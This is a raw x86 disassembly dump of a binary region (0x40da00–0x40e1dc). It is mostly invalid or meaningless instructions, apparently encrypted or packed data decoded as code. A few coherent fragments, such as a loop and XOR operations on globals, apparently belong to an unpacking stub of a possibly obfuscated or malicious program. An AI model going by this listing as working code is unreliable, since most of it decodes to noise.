  40da00:	dec    esi
  40da01:	fist   DWORD PTR [ecx+0xf]
  40da04:	xchg   edi,eax
  40da05:	or     ch,0x23
  40da08:	add    bl,bl
  40da0a:	or     ecx,ecx
  40da0c:	(bad)  
  40da0d:	ror    BYTE PTR [esi-0x47f2547],0x43
  40da14:	and    eax,0xa793a88b
  40da19:	inc    esi
  40da1a:	ds std 
  40da1c:	sbb    DWORD PTR [ecx-0x2cd7f917],esi
  40da22:	mov    dl,0xf1
  40da24:	jle    0x40d9b3
  40da26:	scas   al,BYTE PTR es:[edi]
  40da27:	dec    esi
  40da28:	xchg   BYTE PTR [esi-0x7e],cl
  40da2b:	adc    eax,0xf8c95242
  40da30:	push   ss
  40da31:	ins    BYTE PTR es:[edi],dx
  40da32:	push   es
  40da33:	frstpm(287 only) 
  40da35:	jmp    0xcc03:0x54f0bbf5
  40da3c:	xchg   BYTE PTR [edx+0xc],dl
  40da3f:	xor    BYTE PTR [ecx],0x4b
  40da42:	xchg   ecx,eax
  40da43:	dec    edx
  40da44:	mov    es,esi
  40da46:	cmp    edi,DWORD PTR [eax+eiz*4]
  40da49:	sbb    eax,DWORD PTR [esi]
  40da4b:	and    BYTE PTR [eax],cl
  40da4d:	cmp    edi,edi
  40da4f:	sbb    eax,DWORD PTR [ebx+0x1e]
  40da52:	cdq    
  40da53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da54:	rcr    BYTE PTR [ebx],cl
  40da56:	scas   eax,DWORD PTR es:[edi]
  40da57:	xchg   ebp,eax
  40da58:	jo     0x40da7a
  40da5a:	mov    esp,0xbc5e66b5
  40da5f:	inc    edx
  40da60:	ss inc esi
  40da62:	mov    edx,0x329b54d
  40da67:	mov    bl,dl
  40da69:	cmp    eax,0x39d51271
  40da6e:	outs   dx,BYTE PTR ds:[esi]
  40da6f:	out    dx,al
  40da70:	inc    ebx
  40da71:	xchg   edx,eax
  40da72:	dec    esi
  40da73:	xchg   esi,eax
  40da74:	add    DWORD PTR [ecx+0x6c],edi
  40da77:	add    ebx,DWORD PTR [edi+0x2905ac77]
  40da7d:	mov    cl,0xdb
  40da7f:	(bad)  
  40da80:	sbb    edx,DWORD PTR [ebx-0xf]
  40da83:	fcompp 
  40da85:	jbe    0x40da81
  40da87:	jg     0x40daf7
  40da89:	fnstenv [ebx]
  40da8b:	push   edx
  40da8c:	ret    0x6c9a
  40da8f:	dec    ecx
  40da90:	scas   al,BYTE PTR es:[edi]
  40da91:	cmp    eax,edi
  40da93:	std    
  40da94:	pop    ds
  40da95:	or     edx,DWORD PTR [edi+edx*8+0x5b1f0573]
  40da9c:	sub    al,0x50
  40da9e:	mov    cl,0x1d
  40daa0:	mov    ds:0x45c07372,al
  40daa5:	call   0x3b92:0x450745dd
  40daac:	test   DWORD PTR [eax*1-0x23ca0e35],edi
  40dab3:	and    DWORD PTR [ebx+0x62],ebp
  40dab6:	ficomp WORD PTR [ebx+0x2d9e9cf9]
  40dabc:	jbe    0x40da4f
  40dabe:	int    0xb6
  40dac0:	std    
  40dac1:	push   ebx
  40dac2:	mov    bl,0xe9
  40dac4:	popf   
  40dac5:	sub    BYTE PTR [eax],0xea
  40dac8:	stos   BYTE PTR es:[edi],al
  40dac9:	xchg   ebx,eax
  40daca:	add    al,0xff
  40dacc:	push   ebx
  40dacd:	cmp    eax,0x40dd9a30
  40dad2:	(bad)  
  40dad5:	sub    DWORD PTR ds:[edx],eax
  40dad8:	xchg   edi,eax
  40dad9:	push   eax
  40dada:	mov    eax,0x9e88d09f
  40dadf:	push   esi
  40dae0:	call   0x9f7bf14c
  40dae5:	push   0x55
  40dae7:	ins    DWORD PTR es:[edi],dx
  40dae8:	out    0x16,al
  40daea:	clc    
  40daeb:	push   edx
  40daec:	push   edi
  40daed:	adc    cl,ah
  40daef:	sub    eax,0xfd8c2fa9
  40daf4:	mov    ah,0x36
  40daf6:	mov    ch,0x82
  40daf8:	adc    BYTE PTR cs:[ebx-0x17],0x69
  40dafd:	sub    dl,BYTE PTR [esi-0x7cbca610]
  40db03:	sti    
  40db04:	leave  
  40db05:	(bad)  
  40db06:	js     0x40db4f
  40db08:	xchg   ecx,eax
  40db09:	int3   
  40db0a:	sub    DWORD PTR [esi],ebx
  40db0c:	ror    BYTE PTR [esi-0x717144f4],0xd8
  40db13:	scas   eax,DWORD PTR es:[edi]
  40db14:	jp     0x40daff
  40db16:	push   eax
  40db17:	pop    ds
  40db18:	adc    al,0xff
  40db1a:	jecxz  0x40db16
  40db1c:	inc    esi
  40db1d:	jge    0x40db9a
  40db1f:	jae    0x40db78
  40db21:	jns    0x40db41
  40db23:	gs jecxz 0x40db41
  40db26:	test   eax,0xcbdc6942
  40db2b:	pop    edi
  40db2c:	sub    dh,al
  40db2e:	in     eax,0x9a
  40db30:	jge    0x40db21
  40db32:	push   es
  40db33:	add    al,0x47
  40db35:	jno    0x40dac6
  40db37:	and    eax,0x4421769d
  40db3c:	stos   BYTE PTR es:[edi],al
  40db3d:	jg     0x40db2b
  40db3f:	cmp    bh,dh
  40db41:	test   DWORD PTR [esi],edx
  40db43:	xchg   edx,eax
  40db44:	cmp    eax,0x5b4bec4b
  40db49:	xchg   esp,eax
  40db4a:	gs cmp esp,edx
  40db4d:	sar    bh,1
  40db4f:	dec    eax
  40db50:	fimul  WORD PTR [ebx]
  40db52:	ins    DWORD PTR es:[edi],dx
  40db53:	inc    eax
  40db54:	sub    BYTE PTR [ecx-0x3b],cl
  40db57:	out    dx,eax
  40db58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db59:	pop    ecx
  40db5a:	sub    DWORD PTR [edx+0x67],ebx
  40db5d:	test   al,0xcb
  40db5f:	call   0x9916:0xe0f322f4
  40db66:	aad    0x95
  40db68:	add    DWORD PTR [edx+ebp*1-0x7c230536],edi
  40db6f:	mov    al,ds:0xf0978e7d
  40db74:	hlt    
  40db75:	idiv   BYTE PTR [edx-0x26]
  40db78:	cli    
  40db79:	test   al,0x28
  40db7b:	xor    edi,ebp
  40db7d:	jae    0x40db24
  40db7f:	icebp  
  40db80:	push   0x919b1eb6
  40db85:	push   edx
  40db86:	push   es
  40db87:	sub    bh,bl
  40db89:	pop    edx
  40db8a:	daa    
  40db8b:	sub    al,0xd4
  40db8d:	sub    dl,0x6a
  40db90:	or     eax,0xc8cab065
  40db95:	fbstp  TBYTE PTR [ebx+0x2cb33179]
  40db9b:	jns    0x40dc16
  40db9d:	popf   
  40db9e:	pop    edx
  40db9f:	and    al,0x8
  40dba1:	and    DWORD PTR [esp+eiz*2+0x7800ea43],eax
  40dba8:	jno    0x40dc04
  40dbaa:	jae    0x40dbe6
  40dbac:	inc    ebp
  40dbad:	fidiv  DWORD PTR [edi]
  40dbaf:	stc    
  40dbb0:	jmp    0xc13b:0x75a43a4b
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x2cbfeba4],0xfa72bc37
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbfc
  40dbe0:	daa    
  40dbe1:	out    dx,al
  40dbe2:	jmp    0x36c4:0x452513e9
  40dbe9:	xchg   esp,eax
  40dbea:	and    DWORD PTR [eax+0x79],edi
  40dbed:	popf   
  40dbee:	sbb    eax,0xf214ad37
  40dbf3:	shr    BYTE PTR [ecx],0x7e
  40dbf6:	fnstcw WORD PTR [ecx-0x7ba9a700]
  40dbfc:	shr    cl,1
  40dbfe:	icebp  
  40dbff:	dec    ecx
  40dc00:	sbb    ebp,esp
  40dc02:	mov    eax,ds:0xe21e572e
  40dc07:	mov    ah,ch
  40dc09:	mov    eax,ds:0xff05eaea
  40dc0e:	test   al,0xff
  40dc10:	ja     0x40dba7
  40dc12:	icebp  
  40dc13:	shr    edx,0xfe
  40dc16:	mov    eax,0x94d0ca12
  40dc1b:	adc    DWORD PTR [ebx-0x35],ebp
  40dc1e:	or     eax,DWORD PTR [eax+edx*1-0x4f7726c5]
  40dc25:	and    dl,BYTE PTR [esi-0x26cabad2]
  40dc2b:	mov    esi,0x90ab1052
  40dc30:	dec    edx
  40dc31:	jmp    0x40dbe3
  40dc33:	frstor [esi+0x1c8ad0ac]
  40dc39:	cwde   
  40dc3a:	ins    DWORD PTR es:[edi],dx
  40dc3b:	mov    edi,0x89a95525
  40dc40:	pop    ecx
  40dc41:	lods   al,BYTE PTR ds:[esi]
  40dc42:	adc    edx,DWORD PTR [edx+0x13]
  40dc45:	push   ss
  40dc46:	adc    BYTE PTR [esi+0x6ab9ce3a],0x56
  40dc4d:	xchg   ecx,eax
  40dc4e:	xlat   BYTE PTR ds:[ebx]
  40dc4f:	pop    edi
  40dc50:	les    edi,FWORD PTR [edx+0x5b]
  40dc53:	fwait
  40dc54:	cmp    bl,al
  40dc56:	scas   al,BYTE PTR es:[edi]
  40dc57:	pop    ecx
  40dc58:	(bad)  
  40dc59:	adc    bl,BYTE PTR ds:0x786a4fd6
  40dc5f:	nop
  40dc60:	mov    ebp,0xddb2148b
  40dc65:	xchg   BYTE PTR [eax-0x3a],bl
  40dc68:	fldenv [ebx+0x1]
  40dc6b:	lock ds dec ebx
  40dc6e:	or     BYTE PTR [edx],0x9
  40dc71:	cmp    ah,BYTE PTR [eax]
  40dc73:	scas   eax,DWORD PTR es:[edi]
  40dc74:	or     eax,0x2c640f54
  40dc79:	das    
  40dc7a:	xchg   edi,eax
  40dc7b:	aad    0xfa
  40dc7d:	pop    es
  40dc7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc7f:	jmp    FWORD PTR [edx+ebp*2+0x775b8a9e]
  40dc86:	cmp    ah,BYTE PTR [esi-0x6e18c75]
  40dc8c:	dec    ebp
  40dc8d:	push   edi
  40dc8e:	inc    esi
  40dc8f:	clc    
  40dc90:	outs   dx,DWORD PTR ds:[esi]
  40dc91:	push   0xcfd762e5
  40dc96:	jmp    0x40dc8a
  40dc98:	push   edi
  40dc99:	push   ebx
  40dc9a:	pop    esp
  40dc9b:	out    0x36,eax
  40dc9d:	jae    0x40dd12
  40dc9f:	mov    edx,0xd549b4ee
  40dca4:	cmp    DWORD PTR [esi],0xd46cf759
  40dcaa:	sub    dh,BYTE PTR [ebp-0xd]
  40dcad:	pop    edx
  40dcae:	and    eax,0xe52251be
  40dcb3:	mov    es:0x585118b8,al
  40dcb9:	aad    0x83
  40dcbb:	(bad)  
  40dcbc:	aam    0xca
  40dcbe:	fwait
  40dcbf:	sub    esp,0xc6e14d66
  40dcc5:	(bad)  
  40dcc6:	std    
  40dcc7:	xor    BYTE PTR [ecx+0x26],dl
  40dcca:	gs mov esi,0xc3dbf589
  40dcd0:	pop    ss
  40dcd1:	cmp    al,0xea
  40dcd3:	repnz out dx,eax
  40dcd5:	int    0xe8
  40dcd7:	cmp    bh,BYTE PTR [ebx+0x2af49cb9]
  40dcdd:	push   cs
  40dcde:	dec    BYTE PTR ds:0xcd924c0f
  40dce4:	mov    al,ds:0x417f4d7f
  40dce9:	cld    
  40dcea:	mov    ecx,0x1cb266f9
  40dcef:	loopne 0x40dcd1
  40dcf1:	xchg   ebx,eax
  40dcf2:	mov    cl,0xd6
  40dcf4:	or     al,0xd3
  40dcf6:	imul   edx,DWORD PTR [edi+eax*4-0x5f],0x421542d0
  40dcfe:	jle    0x40dd00
  40dd00:	outs   dx,BYTE PTR ds:[esi]
  40dd01:	das    
  40dd02:	mov    ds:0xf8c23a6e,al
  40dd07:	stos   BYTE PTR es:[edi],al
  40dd08:	sub    al,0x4b
  40dd0a:	ss out dx,eax
  40dd0c:	xor    cl,BYTE PTR [eax+ebp*8-0x48e8019a]
  40dd13:	mov    dl,0xd6
  40dd15:	mov    es,WORD PTR [ecx-0x349efcab]
  40dd1b:	inc    ebp
  40dd1c:	jmp    0x7119:0x7955b419
  40dd23:	push   edi
  40dd24:	cmp    ch,ah
  40dd26:	cmp    BYTE PTR ds:0xac12930a,dh
  40dd2c:	cmp    DWORD PTR [ebx-0x31],0x56
  40dd30:	inc    edx
  40dd31:	xchg   ecx,eax
  40dd32:	mov    ecx,DWORD PTR [ebx-0x2]
  40dd35:	inc    ebp
  40dd36:	xchg   esp,eax
  40dd37:	inc    ecx
  40dd38:	mov    esp,0xc86f5e12
  40dd3d:	add    al,0x5
  40dd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd41:	push   edi
  40dd42:	cli    
  40dd43:	mov    dl,0xb4
  40dd45:	lahf   
  40dd46:	xor    BYTE PTR [ebx+0x49],dl
  40dd49:	push   edx
  40dd4a:	mov    edx,ecx
  40dd4c:	repnz test al,0xa0
  40dd4f:	mov    esi,0x538d7b6a
  40dd54:	mov    ah,0xd1
  40dd56:	(bad)  
  40dd57:	scas   eax,DWORD PTR es:[edi]
  40dd58:	(bad)  
  40dd59:	jmp    0xf8f8:0xc7e0f74e
  40dd60:	adc    BYTE PTR [ecx-0x28],dh
  40dd63:	xlat   BYTE PTR ds:[ebx]
  40dd64:	call   0xfbee:0x4e6824b4
  40dd6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6c:	mov    ds:0xb7057859,al
  40dd71:	cdq    
  40dd72:	loopne 0x40dd50
  40dd74:	loop   0x40dcff
  40dd76:	enter  0x8507,0x80
  40dd7a:	push   es
  40dd7b:	mov    cs,WORD PTR [esi]
  40dd7d:	mov    ebp,0x14856fe0
  40dd82:	int    0x2f
  40dd84:	imul   ebx,DWORD PTR [esi],0xffffffcc
  40dd87:	xchg   esi,eax
  40dd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd8a:	push   edx
  40dd8b:	cwde   
  40dd8c:	inc    edx
  40dd8d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd8f:	jmp    0x5601a3e0
  40dd94:	push   esp
  40dd95:	inc    esp
  40dd96:	bound  ecx,QWORD PTR [ecx]
  40dd98:	lods   eax,DWORD PTR ds:[esi]
  40dd99:	stc    
  40dd9a:	push   edi
  40dd9b:	mov    dh,BYTE PTR [esi+0x37]
  40dd9e:	outs   dx,DWORD PTR ds:[esi]
  40dd9f:	cmp    al,0x42
  40dda1:	mov    esi,0x80b4a2a
  40dda6:	popa   
  40dda7:	pop    ds
  40dda8:	sub    al,0x63
  40ddaa:	fimul  WORD PTR [edx+0x4dce13fb]
  40ddb0:	mov    dl,0xc2
  40ddb2:	sahf   
  40ddb3:	mov    edi,0x17aa32f9
  40ddb8:	push   ebp
  40ddb9:	jmp    0x61551222
  40ddbe:	in     eax,0x88
  40ddc0:	inc    ebp
  40ddc1:	fmul   DWORD PTR [ebx+0x62a84d1a]
  40ddc7:	sbb    BYTE PTR [edi-0x41f8df59],al
  40ddcd:	sahf   
  40ddce:	or     dh,BYTE PTR [esi+0xd]
  40ddd1:	mov    ebp,ecx
  40ddd3:	pop    edx
  40ddd4:	cld    
  40ddd5:	inc    ebp
  40ddd6:	cmp    DWORD PTR [ebp-0x65ef982],edx
  40dddc:	idiv   BYTE PTR [edx-0x7f9cfc74]
  40dde2:	fidiv  WORD PTR [eax]
  40dde4:	or     al,BYTE PTR [edi]
  40dde6:	inc    DWORD PTR [ebx-0x67]
  40dde9:	iret   
  40ddea:	imul   esp,DWORD PTR [esp+esi*1+0x47],0x45052fbc
  40ddf2:	(bad)  
  40ddf3:	in     al,dx
  40ddf4:	cwde   
  40ddf5:	add    bl,BYTE PTR [edx-0x1af78c31]
  40ddfb:	lds    edx,FWORD PTR [ecx]
  40ddfd:	jbe    0x40dd81
  40ddff:	ret    0xbb4b
  40de02:	add    eax,DWORD PTR [ecx-0x2a68ea8f]
  40de08:	pop    ecx
  40de09:	jle    0x40dde2
  40de0b:	mov    ch,0x29
  40de0d:	pop    edx
  40de0e:	int    0x2d
  40de10:	add    BYTE PTR [eax-0xbf0435d],cl
  40de16:	cmc    
  40de17:	mov    al,ds:0x5d16748c
  40de1c:	fcom   QWORD PTR [ebx]
  40de1e:	add    al,0x3
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	neg    ebp
  40dea7:	fadd   QWORD PTR [eax+edi*4]
  40deaa:	mov    edx,0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40debc
  40deb3:	mov    BYTE PTR [eax+0x6500666b],bl
  40deb9:	dec    eax
  40deba:	mov    bh,0xd4
  40debc:	cdq    
  40debd:	jp     0x40deab
  40debf:	pop    esp
  40dec0:	leave  
  40dec1:	fs test dl,al
  40dec4:	es ret 0x797c
  40dec8:	imul   DWORD PTR gs:0x14d6fd8f
  40decf:	push   ss
  40ded0:	pop    esi
  40ded1:	imul   esi,edx,0x34e845c9
  40ded7:	cmp    BYTE PTR [eax],dh
  40ded9:	mov    al,0x9d
  40dedb:	or     ch,dh
  40dedd:	push   es
  40dede:	jmp    0x40ded6
  40dee0:	dec    ecx
  40dee1:	dec    ebx
  40dee2:	inc    edi
  40dee3:	mov    al,0xb8
  40dee5:	inc    ebp
  40dee6:	mov    bh,BYTE PTR [ebx]
  40dee8:	stc    
  40dee9:	add    al,0xd3
  40deeb:	push   0x5d8fc52
  40def0:	add    eax,DWORD PTR [eax+edx*1+0x8]
  40def4:	arpl   WORD PTR [ecx-0xa],ax
  40def7:	xor    BYTE PTR [edx+0x53f5f7a8],al
  40defd:	inc    edi
  40defe:	arpl   WORD PTR [esi-0x514589e0],bx
  40df04:	sub    DWORD PTR [esi],esp
  40df06:	mov    ds,WORD PTR ds:0x47468fc0
  40df0c:	sbb    BYTE PTR [ecx],dl
  40df0e:	push   ss
  40df0f:	cmp    DWORD PTR [esi-0x5d],esp
  40df12:	cmp    ch,BYTE PTR [eax-0x1b]
  40df15:	xchg   edi,eax
  40df16:	in     al,0x90
  40df18:	cs test eax,0x3e333fa7
  40df1e:	lock (bad) 
  40df20:	xchg   BYTE PTR [eax-0x36095465],cl
  40df26:	and    eax,0xe67f4ead
  40df2b:	adc    ch,BYTE PTR [eax]
  40df2d:	add    BYTE PTR [ecx-0xc3c0b99],bl
  40df33:	inc    ebx
  40df34:	call   0xb0dd:0xd3d7fca9
  40df3b:	fs jp  0x40dfa0
  40df3e:	ret    
  40df3f:	nop
  40df40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df41:	add    BYTE PTR [ebp-0x2c],bl
  40df44:	sub    eax,0x91178b03
  40df49:	sbb    al,0xdd
  40df4b:	mov    ecx,0x72caa44e
  40df50:	push   0x761f71a3
  40df55:	mov    ebx,0xc98f2dd
  40df5a:	pop    ds
  40df5b:	inc    esp
  40df5c:	retf   0xd38e
  40df5f:	sbb    DWORD PTR [edx-0x64],ebp
  40df62:	or     BYTE PTR [edx+0x46],al
  40df65:	aam    0x67
  40df67:	into   
  40df68:	mov    eax,0x995ef82a
  40df6d:	mov    ch,0x59
  40df6f:	ret    
  40df70:	clc    
  40df71:	add    ebx,ebp
  40df73:	or     DWORD PTR [ecx],edx
  40df75:	sub    ecx,esp
  40df77:	adc    edi,DWORD PTR [ebp+eiz*8-0x5d]
  40df7b:	cmp    DWORD PTR es:[ecx-0x10],0xffffffcf
  40df80:	retf   
  40df81:	test   eax,0xafd07414
  40df86:	adc    al,0xd9
  40df88:	or     ecx,DWORD PTR [eax+0x27]
  40df8b:	fisubr DWORD PTR [eax-0x1f36b6d]
  40df91:	in     al,0x92
  40df93:	sbb    esp,DWORD PTR [edi-0x6711e73a]
  40df99:	jo     0x40df2b
  40df9b:	cmp    BYTE PTR [edx+0x49],dh
  40df9e:	pop    ebx
  40df9f:	jb     0x40df50
  40dfa1:	mov    eax,0x5127c84f
  40dfa6:	call   0xd76d:0xf1a205ef
  40dfad:	mov    esp,DWORD PTR [esp-0x5d]
  40dfb1:	sbb    BYTE PTR [ecx-0x51],bh
  40dfb4:	xchg   edi,eax
  40dfb5:	cmp    DWORD PTR [esi],ebp
  40dfb7:	jecxz  0x40df7c
  40dfb9:	outs   dx,DWORD PTR ds:[esi]
  40dfba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfbc:	(bad)  
  40dfbd:	loope  0x40e00a
  40dfbf:	dec    ebp
  40dfc0:	add    esp,eax
  40dfc2:	dec    eax
  40dfc3:	sub    dl,bh
  40dfc5:	xor    dh,dl
  40dfc7:	out    0x45,al
  40dfc9:	xchg   edx,eax
  40dfca:	(bad)
  40dfcd:	cwde   
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433697,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	sar    DWORD PTR [ebx-0x62a16131],1
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40dff8
  40e010:	inc    eax
  40e011:	xchg   edx,eax
  40e012:	sub    eax,0x2d62e242
  40e017:	mov    eax,ds:0xe29ebefa
  40e01c:	(bad)  
  40e01d:	mov    DWORD PTR [ecx+0x70c5cf74],ebp
  40e023:	fiadd  DWORD PTR [ebp-0x204616dc]
  40e029:	sub    cl,0xc8
  40e02c:	inc    eax
  40e02d:	add    ebp,eax
  40e02f:	jmp    0x40e016
  40e031:	(bad)  
  40e032:	fild   WORD PTR [edi+0x756fb8]
  40e038:	call   0xde3520fc
  40e03d:	and    BYTE PTR [edi],dl
  40e03f:	test   BYTE PTR [edi],bl
  40e041:	frstor [eax+0x7a]
  40e044:	loop   0x40e02d
  40e046:	aas    
  40e047:	dec    edx
  40e048:	cmp    ebp,DWORD PTR [esi]
  40e04a:	adc    dl,BYTE PTR [ecx-0x2f033976]
  40e050:	inc    ebp
  40e051:	jnp    0x40e09c
  40e053:	rcl    BYTE PTR [esi],0x1e
  40e056:	sbb    eax,0x8f08257c
  40e05b:	adc    BYTE PTR [edx],bl
  40e05d:	fist   DWORD PTR [ebp-0x1e]
  40e060:	and    al,0x83
  40e062:	add    al,0xd4
  40e064:	xor    esp,edx
  40e066:	cmp    bh,BYTE PTR [edi-0x14]
  40e069:	sti    
  40e06a:	add    esi,DWORD PTR [esi]
  40e06c:	dec    ebx
  40e06d:	mov    al,0xf2
  40e06f:	mov    edi,0xe41c915a
  40e074:	imul   edx,DWORD PTR [esi+0x7f],0x963b7c44
  40e07b:	push   ecx
  40e07c:	in     al,dx
  40e07d:	mov    ecx,0x4a0d0ae7
  40e082:	daa    
  40e083:	pusha  
  40e084:	shl    DWORD PTR [ebp-0x9],cl
  40e087:	push   DWORD PTR [edi+0x65]
  40e08a:	xchg   edx,eax
  40e08b:	bound  ebp,QWORD PTR [ebx-0x73]
  40e08e:	or     eax,0x36130b49
  40e093:	or     eax,0xc3d2bd93
  40e098:	leave  
  40e099:	sub    ch,ch
  40e09b:	(bad)  
  40e09c:	(bad)
  40e0a0:	push   ss
  40e0a1:	pop    ebx
  40e0a2:	addr16 mov dl,0x34
  40e0a5:	loop   0x40e046
  40e0a7:	shl    BYTE PTR [esi+0x33],0x52
  40e0ab:	inc    ebx
  40e0ac:	sub    eax,0x7ddd24d9
  40e0b1:	aaa    
  40e0b2:	sub    esi,DWORD PTR [ecx-0x58713afa]
  40e0b8:	xchg   edx,eax
  40e0b9:	nop
  40e0ba:	or     bh,ch
  40e0bc:	cmp    ebx,ecx
  40e0be:	jl     0x40e099
  40e0c0:	jmp    0x5a813991
  40e0c5:	mov    eax,ds:0xa2d7145b
  40e0ca:	aaa    
  40e0cb:	push   edx
  40e0cc:	and    eax,0x4e8df9c2
  40e0d1:	arpl   WORD PTR [edi-0x5b],bp
  40e0d4:	push   ecx
  40e0d5:	(bad)  
  40e0d7:	cs jmp 0xdfbb95ac
  40e0dd:	mov    edx,DWORD PTR [esi-0x2770755a]
  40e0e3:	mov    esi,0xc41d3d2d
  40e0e8:	outs   dx,DWORD PTR ds:[esi]
  40e0e9:	nop
  40e0ea:	outs   dx,BYTE PTR ds:[esi]
  40e0eb:	jmp    0x40e139
  40e0ed:	loopne 0x40e078
  40e0ef:	and    ebx,edx
  40e0f1:	lock jns 0x40e0f4
  40e0f4:	mov    BYTE PTR [edx-0x7ff65953],cl
  40e0fa:	sbb    al,0xe2
  40e0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0fd:	retf   0x9d14
  40e100:	shl    DWORD PTR [edi+0x2],cl
  40e103:	add    DWORD PTR [eax-0x7a84e7e2],0x17ca1542
  40e10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e10e:	fisubr WORD PTR [esi]
  40e110:	addr16 dec ebp
  40e112:	out    0x30,al
  40e114:	cmovle ecx,ecx
  40e117:	add    al,0x80
  40e119:	jmp    0xf73d:0xacc41bf1
  40e120:	icebp  
  40e121:	push   esi
  40e122:	jge    0x40e0cf
  40e124:	dec    edi
  40e125:	jg     0x40e0ce
  40e127:	dec    ecx
  40e128:	jmp    0x1581:0xc6336788
  40e12f:	mov    ds:0x97004336,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	imul   ebx,DWORD PTR [eax-0x658d6103],0x7f127e7e
  40e164:	jle    0x40e1e4
  40e166:	call   0x1745:0xf2c9d5d5
  40e16d:	daa    
  40e16e:	jmp    0x40e160
  40e170:	(bad)  
  40e171:	outs   dx,BYTE PTR ds:[esi]
  40e172:	sbb    BYTE PTR [ebx+ecx*8-0x65ed6106],ch
  40e179:	lods   eax,DWORD PTR ds:[esi]
  40e17a:	scas   eax,DWORD PTR es:[edi]
  40e17b:	push   esi
  40e17c:	inc    esi
  40e17d:	rol    cl,cl
  40e17f:	pop    ds
  40e180:	out    0x7,al
  40e182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e183:	push   eax
  40e184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e185:	rcr    DWORD PTR [eax+0x5e],1
  40e188:	and    bh,BYTE PTR [ebx]
  40e18a:	xchg   esp,eax
  40e18b:	mov    cl,0x3f
  40e18d:	icebp  
  40e18e:	pop    ds
  40e18f:	pop    ss
  40e190:	jmp    0xc4f4:0xa9de3c83
  40e197:	mov    BYTE PTR [ecx-0x17efc135],dl
  40e19d:	aad    0x91
  40e19f:	ins    BYTE PTR es:[edi],dx
  40e1a0:	add    eax,0x387202d6
  40e1a5:	inc    esp
  40e1a6:	sub    BYTE PTR [ebx],bh
  40e1a8:	fdiv   QWORD PTR [ebx]
  40e1aa:	pop    ds
  40e1ab:	stos   DWORD PTR es:[edi],eax
  40e1ac:	mov    cl,BYTE PTR [ecx-0x7cc4e822]
  40e1b2:	mov    esp,0xc7c50c4b
  40e1b7:	lahf   
  40e1b8:	ins    BYTE PTR es:[edi],dx
  40e1b9:	dec    esp
  40e1ba:	mov    edi,0xabe205e3
  40e1bf:	enter  0xf641,0x42
  40e1c3:	lods   eax,DWORD PTR ds:[esi]
  40e1c4:	repnz and eax,DWORD PTR [esi]
  40e1c7:	xor    DWORD PTR [ebx-0x20],esp
  40e1ca:	enter  0x7dea,0x97
  40e1ce:	fild   QWORD PTR [ebx]
  40e1d0:	mov    eax,ds:0xfc647fbd
  40e1d5:	pop    ebx
  40e1d6:	sahf   
  40e1d7:	test   eax,0x2f3e4812
  40e1dc:	stc    
